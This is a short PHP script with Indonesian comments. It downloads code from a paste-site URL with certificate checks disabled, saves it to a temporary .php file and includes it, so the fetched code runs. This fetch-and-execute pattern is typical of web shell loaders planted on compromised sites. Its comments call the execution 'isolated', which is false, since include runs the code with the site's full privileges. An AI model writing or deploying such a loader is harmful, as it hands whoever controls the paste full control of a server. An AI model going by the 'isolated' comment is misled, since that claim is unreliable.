<?php

function getURL($url) {
    // gunakan curl kalau tersedia
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    // fallback ke file_get_contents
    return @file_get_contents($url);
}

$url  = "https://paste.ajam.dev/raw/44A4MK";
$code = getURL($url);

if (!$code) {
    die("Gagal mengambil kode");
}

// simpan sementara agar tidak eval string mentah
$tmp = sys_get_temp_dir() . "/remote_". md5($url) .".php";
file_put_contents($tmp, $code);

// jalankan secara terisolasi
include $tmp;